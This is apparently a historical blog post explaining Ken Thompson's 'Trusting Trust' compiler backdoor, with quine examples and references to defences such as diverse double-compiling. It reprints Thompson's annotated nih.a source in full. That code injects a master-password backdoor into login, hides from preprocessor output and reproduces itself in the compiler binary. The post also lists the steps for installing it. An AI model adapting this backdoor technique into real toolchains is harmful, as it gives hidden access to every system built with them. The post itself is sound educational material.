+++
title = "That Time Ken Thompson Wrote a Backdoor into the C Compiler"
date = 2025-10-23
updated = 2025-10-23
draft = false

[taxonomies]
categories = ["programming", "compilers"]
tags = ["infosec"]

[extra]
toc = true
+++

When Ken Thompson won the Turing Award jointly with Dennis Ritchie for their
work in UNIX, he was expected like other Turing winners to write a paper that
would be published in the ACM Computer Journal. What he ended up submitting was
a paper about "the cutest program \[he\] ever wrote"-- a sneaky undetectable
self-reproducing "Trojan horse" backdoor in the C compiler that would allow him
to log into affected machines as any user.

<!-- more -->

{{ youtube(id="OmVHkL0IWk4", start_time_s=9951, captions=true) }}

## Overview

Thompson didn't want to write about the usual things that Turing award winners
write about— in fact, according to him,[^1] he didn't want to write a paper at
all. However, when he did finally write a paper (after putting it off for a year
past the original deadline, see ~2:52:49 in the above video), he describes at a
high level how the C compiler (itself a program written in C) parses and
compiles C source code into machine code to set the stage for how the "Trojan
horse" would be injected into the generated machine code while leaving the
original input C source code seemingly unmodified.

He explains that while in college at UC Berkeley, him and colleagues would
"[amuse themselves] by posing programming exercises," one of which was "to
write the shortest self-reproducing program":

> More precisely stated, the problem is to write a source program that, when
> compiled and executed, will produce as output an exact copy of its source ...
> The part about "shortest" was just an incentive to demonstrate skill and
> determine a winner.

## The Trojan Horse

In this section, I'll try to illustrate the "Trojan horse" originally presented
by Thompson through a combination of the original quasi-C pseudocode and the
source code and examples from Russ Cox's article on this subject, where Cox got
Thompson to actually send him the source code after seeing a talk Thompson gave
in 2023.[^2]

### Stage I: Self-Reproducing Programs

In this stage, Thompson describes a self-reproducing program (also known as a
"quine"[^3]). The key insight is that a program can contain its own source code
as data, which it then prints along with the code to print it.

Here's Thompson's example from the paper:

```c
/* Figure 1 */
char s[] = {
  '\t',
  '0',
  '\n',
  // (213 lines deleted)
  0
};

/*
  * The string s is a
  * representation of the body
  * of this program from `0`
  * to the end.
*/

main()
{
  int i;

  printf("char\ts[ ] = {\n");
  for (i = 0; s[i]; i++) {
    printf("\t%d,\n", s[i]);
  }
  printf("%s", s);
}
```

There are two critical properties here to make note of for later:

1. "This program can easily be written by another program."
2. "This program can contain an arbitrary amount of excess baggage that will be
   reproduced along with the main algorithm."

{{ note(
hidden=true,
header="'Simple Transliterations' Note from Original Paper",
body='

Here are some simple transliterations to allow a non-C programmer to read this
code:

| Operator | Meaning                      |
| -------- | ---------------------------- |
| `=`      | assignment                   |
| `==`     | equal to                     |
| `!=`     | not equal to                 |
| `++`     | increment                    |
| \`x\`    | single character constant    |
| \"xxx\"  | multiple character string    |
| _%d_     | format to convert to decimal |
| _%s_     | format to convert to string  |
| _\\t_    | tab character                |
| _\\n_    | newline character            |

'
) }}

Here's a classic Python quine to demonstrate the self-reproducing behavior:

```python
s = 's = %r\nprint(s %% s)'
print(s % s)
```

`s` holds a string that is almost the whole program, including the placeholder
`%r`, which formats via `repr()`. The `print(s % s)` uses Python's old C-style
`%`-formatting.

Important notes about the characters inside `s`:

- `%r` is a placeholder: it tells Python to insert the `repr()` of the argument
  doing the `%`-formatting.
- `\n` is the newline character to separate the two source lines produced in the
  output.
- `%%` is to be able to include a literal `%` in a string that will be used with
  `%`-formatting; after formatting it becomes a single `%`.

The `%r` inside the string is replaced by the Python string representation of
`s` itself, so the program prints the text of `s = ...` followed by the `print`
line. The `%r` is the key as it auto-escapes and auto-quotes the representation
so the printed string is a valid piece of Python code. Here's the result of
running the program:

```
Python 3.13.2 (main, Feb 26 2025, 14:47:35) [Clang 16.0.0 (clang-1600.0.26.6)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> s = 's = %r\nprint(s %% s)'
... print(s % s)
...
s = 's = %r\nprint(s %% s)'
print(s % s)
```

### Stage II: Compilers "Learn"

Thompson uses the example of how the C compiler handles character escape
sequences to show how a compiler can teach itself new knowledge.

In C, you can write string literals with escape sequences:

```c
"Hello world\n"
```

The compiler needs to know what character code `\n` represents. Here's the
clever part: the compiler can learn this in a completely portable way.

```c
/* Figure 2.1 - Original escape sequence handling */
c = next();
if (c == '\\') {
    c = next();
    if (c == 'n')
        c = '\n';
}
```

This code handles the backslash escape sequences. Notice how it uses `'\n'` to
return the newline character—the compiler "knows" what `\n` means because it's
baked-in to C itself.

Ok, now suppose we want to add support for `\v` (vertical tab). We'd like to write:

```c
/* Figure 2.2 - Desired code with \v support */
c = next();
if (c == '\\') {
    c = next();
    if (c == 'n')
        c = '\n';
    if (c == 'v')
        c = '\v';  // New: vertical tab
}
```

But there's a problem: the current compiler doesn't understand `\v` yet, so this
source code won't compile— we need to "train" the compiler first.

The solution is to temporarily use the actual character code (11 for vertical
tab in ASCII):

```c
/* Figure 2.3 - Training the compiler */
c = next();
if (c == '\\') {
    c = next();
    if (c == 'n')
        c = '\n';
    if (c == 'v')
        c = 11;  // Temporarily use the numeric code
}
```

This version compiles successfully with the old compiler. Once we compile and
install this new binary as the official C compiler, it now "knows" what `\v`
means. We can then go back and rewrite the code using the portable `'\v'` form
(Figure 2.2), and the new compiler will accept it.

As Thompson notes:

> This is a deep concept. It is as close to a "learning" program as I have seen.
> You simply tell it once, then you can use this self-referencing definition.

This self-referencing property is key to understanding how the Trojan horse
works: once the compiler is "taught" something malicious, it can perpetuate that
knowledge even after the evidence is removed from the source code.

### Stage III: Slipping in the Trojan Horse

So now we have arrived to the actual Trojan horse logic. The idea of a Trojan
horse predates Thompson's original work on C by at least a few years, with
Thompson saying in the paper that he originally read about such an attack in "an
Air Force critique of the security of an early implementation of
Multics."[^4],[^5]

Thompson's paper presents the concept in pseudocode:

```c
/* Figure 3.2 - Simple Trojan horse concept */
compile(s)
char *s;
{
  // Trojan horse
  if (match(s, "pattern")) {
    compile("bug");
    return;
  }
  // ...
}
```

But here's the actual implementation from Thompson's `nih.a` file, with
annotations by Russ Cox (I highly recommend seeing his article for a more
detailed step-through of the code, as well as following along with his [Unix
simulator](https://research.swtch.com/v6/)):[^2]

```c
/* Declare the global variable nihflg, of implied type int. */
nihflg;

/* Define the function codenih, with implied return type int and no arguments.
   The compiler will be modified to call codenih during preprocessing,
   for each input line. */
codenih()
{
    char *p, *s;
    int i;

    /* cc -p prints the preprocessor output instead of invoking the
       compiler back end. To avoid discovery, do nothing when -p is used.
       The implied return type of codenih is int, but early C allowed
       omitting the return value. */
    if (pflag)
        return;

    /* Skip leading tabs in the line. */
    p = line;
    while (*p == '\t')
        p++;

    /* Look for the line "namep = crypt(pwbuf);" from login.c.
       If not found, jump to l1. */
    s = "namep = crypt(pwbuf);";
    for (i = 0; i < 21; i++)
        if (s[i] != p[i])
            goto l1;

    /* Define login backdoor code s, which does:
       Check for the password "codenih".
       If found, modify namep and np so that the code that follows
       in login.c will accept the password. */
    p =+ i;
    s = "for(c=0;c<8;c++)"
        "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"
        "while(*namep)namep++;"
        "while(*np!=':')np++;x1x:";

    /* With the p=+i from above, this is: strcpy(p+i, s); return;,
       appending the backdoor to the line.
       In early C, += was spelled =+.
       The loop is strcpy, and goto l4 jumps to the end of the function. */
    for (i = 0;; i++)
        if (!(*p++ = s[i]))
            break;
    goto l4;

    /* No match for login code. Next target:
       the distinctive line "av[4] = "-P";" from cc.c.
       If not found, jump to l2. */
l1:
    s = "av[4] = \"-P\";";
    for (i = 0; i < 13; i++)
        if (s[i] != p[i])
            goto l2;

    /* Increment nihflg to 1 to remember evidence of being in cc.c,
       and return. */
    nihflg++;
    goto l4;

    /* Next target: input reading loop in cc.c,
       but only if we've seen the av[4] line too:
       the text "while(getline()) {" is too generic and may be
       in other programs. If not found, jump to l3. */
l2:
    if (nihflg != 1)
        goto l3;
    s = "while(getline()) {";
    for (i = 0; i < 18; i++)
        if (s[i] != p[i])
            goto l3;

    /* Append input-reading backdoor: call codenih
       (this very code!) after reading each line.
       Increment nihflg to 2 to move to next state. */
    p =+ i;
    s = "codenih();";
    for (i = 0;; i++)
        if (!(*p++ = s[i]))
            break;
    nihflg++;
    goto l4;

    /* Next target: flushing output in cc.c. */
l3:
    if (nihflg != 2)
        goto l4;
    s = "fflush(obuf);";
    for (i = 0; i < 13; i++)
        if (s[i] != p[i])
            goto l4;

    /* Insert end-of-file backdoor: call repronih
       to reproduce this very source file (the definitions of
       codenih and repronih) at the end of the now-backdoored
       text of cc.c. */
    p =+ i;
    s = "repronih();";
    for (i = 0;; i++)
        if (!(*p++ = s[i]))
            break;
    nihflg++;
l4:;
}
```

This code does three things:

1. **Backdoors the login program**: When compiling `login.c`, it inserts code
   that accepts the password "codenih" for any user
2. **Recognizes itself**: When compiling the C compiler (`cc.c`), it detects
   specific patterns that identify the compiler source
3. **Self-reproduces**: When compiling the compiler, it injects the code for
   both backdoors into the new compiler binary

The final piece is the self-reproduction mechanism:

```c
/* Here the magic begins, as presented in the Turing lecture.
   The %0 is not valid C. Instead, the script rc will replace the %
   with byte values for the text of this exact file,
   to be used by repronih. */
char nihstr[] {
%0
};

repronih()
{
    int i, n, c;

    /* If nihflg is not 3, this is not cc.c so don't do anything. */
    if (nihflg != 3)
        return;

    /* The most cryptic part of the whole program.
       Scan over nihstr (indexed by i) in five phases according to n:

       n=0: emit literal text before "%"
       n=1: emit octal bytes of text before "%"
       n=2: emit octal bytes of "%" and rest of file
       n=3: no output, looking for "%"
       n=4: emit literal text after "%" */

    for (i = n = 0; c = nihstr[i]; i++) {
        if (n == 0 && c == '%') {
            printf("{\n");
            n++;
            continue;
        }
        if (n == 1 && c == '%') {
            n++;
            i = 0;
        }
        if (n == 2) {
            printf("\t0%o,\n", c);
            continue;
        }
        if (n == 3 && c == '%') {
            printf("};\n");
            n++;
            continue;
        }
        if (n > 0 && n < 3)
            printf("\t0%o,\n", c);
        if (n == 0 || n >= 4)
            putchar(c);
    }
}
```

{{ note(
hidden=false,
header="Why Source Code Auditing Fails Here",
body='
No amount of reviewing source code would catch this, because the malicious logic
never appears in the source once the system is "trained." The infection exists
one layer below—inside the binary that generates other binaries. This is the
essence of the Trusting Trust problem: if your compiler (or any build tool) is
compromised, every program it builds is potentially compromised—**even if their
sources are pristine**.
'
) }}

## The Training Process

To actually deploy this attack, Thompson had to "train" the compiler in stages:

1. **First compilation**: Take a clean C compiler and add the `codenih()` and
   `repronih()` functions to its source. The `%0` placeholder gets expanded by a
   helper script (`rc`) into the actual byte values of the source code itself.

2. **Install backdoored compiler**: Compile this modified source with the clean
   compiler, creating a backdoored binary. Install this as the official C
   compiler.

3. **Remove evidence**: Now recompile the C compiler using the backdoored
   binary, but this time using the original clean source code (without the
   backdoor code). The backdoored compiler will recognize the compiler source
   and inject the backdoor code anyway, creating a new backdoored binary.

4. **Perpetuation**: From this point forward, the backdoor lives only in the
   binary. Every time the compiler compiles itself, it injects the backdoor.
   Every time it compiles `login.c`, it inserts the password backdoor. The
   source code remains clean.

## Closing

_Was this actually ever distributed in the C compiler?_

In an email from Thompson to an inquirer[^6], Thompson writes:

<pre>
From: Ken Thompson <ken@google.com>
Date: Wed, Sep 28, 2011 at 6:27 PM
Subject: Re: Was compiler from "Reflections" ever built or distributed?
To: Ezra Lalonde <ezra@usefuliftrue.com>

build and not distributed.

On Wed, Sep 28, 2011 at 11:35 AM, Ezra Lalonde <ezra@usefuliftrue.com> wrote:

> Hi Ken,
>
> I've seen various sources on the internet claiming that the "trojan horse"
> compiler you mentioned in your talk "Reflections on Trusting Trust" was
> actually built, and some further claiming that it was distributed.
>
> I'd like to know if these claims are valid.
>
> Thanks for your time.
>
> Cheers,
> Ezra Lalonde
</pre>

So, at least according to Thompson, this never made it out into the wild.
However he also does leave this humorous line in the ACM paper:

> The moral is obvious. You can't trust code that you did not totally create
> yourself. (Especially code from companies that employ people like me.)

For those interested, there has been followup research conducted after
Thompson's paper that have shown how to prevent these types of attacks, like
diverse double-compiling (DDC).[^7],[^8]

---

## References

[^1]:
    YouTube: [Oral History of Ken
    Thompson](https://www.youtube.com/watch?v=OmVHkL0IWk4&t=15907s) by [Computer
    History Museum](https://www.youtube.com/@ComputerHistory).

    Original inspiration for this post, a great history from the man himself
    describing his life and career from building Ham radios in his youth to his
    time at Bell Labs to his time at Google.

[^2]:
    Blog: [Running the “Reflections on Trusting Trust”
    Compiler](https://research.swtch.com/nih). Cox also links to an interactive
    simulator of the backdoor: [simulator](https://research.swtch.com/v6/)

    **Side note**: In addition to this article, I highly recommend reading Cox's
    excellent articles on implementing regular expressions: [Implementing
    Regular Expressions ](https://swtch.com/~rsc/regexp/)

[^3]:
    Wikipedia: ["Quine (computing)"](<https://en.wikipedia.org/wiki/Quine_(computing)>):

    "A quine is a computer program that takes no input and produces a copy of
    its own source code as its only output."

    Here's a small Lua quine from the page as an example that also is able to
    evaluate a string:

    ```lua
    s="print(string.format('s=%c%s%c; load(s)()',34,s,34))"; load(s)()
    ```

    Invoking this program via the Lua REPL produces the following output:

    ```
    Lua 5.4.8  Copyright (C) 1994-2025 Lua.org, PUC-Rio
    > s="print(string.format('s=%c%s%c; load(s)()',34,s,34))"; load(s)()
    s="print(string.format('s=%c%s%c; load(s)()',34,s,34))"; load(s)()
    ```

[^4]:
    Paper: ["Reflections on Trusting Trust"](https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf)

    Thompson, Ken. “Reflections on Trusting Trust.” Communications of the ACM
    27, no. 8 (1l984): 761–63.
    [https://doi.org/10.1145/358198.358210](https://doi.org/10.1145/358198.358210).

[^5]:
    The "Unknown Air Force Document" mentioned in Thompson's paper: [Multics
    Security Evaluation: Vulnerability
    Analysis](https://web.archive.org/web/20110709024412/http://csrc.nist.gov/publications/history/karg74.pdf).

    A security audit of Multics release in June 1974. In particular, p. 54-55
    outline the "Trojan horse" attack, although it is referred to as a subclass
    of "trap door" attacks.

[^6]:
    Skeptics Stack Exchange: ["Was the C compiler trojan horse written by Ken
    Thompson ever
    distributed?"](https://skeptics.stackexchange.com/questions/6386/was-the-c-compiler-trojan-horse-written-by-ken-thompson-ever-distributed)

[^7]:
    McDermott, J. (1988, October). A technique for removing an important class
    of Trojan horses from high order languages. In Proc. 11th National Computer
    Security Conference (pp. 114-117). [https://apps.dtic.mil/sti/tr/pdf/ADA462303.pdf](https://apps.dtic.mil/sti/tr/pdf/ADA462303.pdf)

    This paper, published in 1988, demonstrates a means of preventing the
    "Trojan horse," as well as outlining some practical issues of implementing
    such a system.

[^8]:
    [Countering Trusting Trust through Diverse Double-Compiling
    (DDC)](https://dwheeler.com/trusting-trust/wheelerd-trust.pdf), David A.
    Wheeler, Proceedings of the Twenty-First Annual Computer Security
    Applications Conference (ACSAC), December 5-9, 2005, Tucson, Arizona, pp.
    28-40, Los Alamitos: IEEE Computer Society. ISBN 0-7695-2461-3, ISSN
    1063-9527, IEEE Computer Society Order Number P2461.
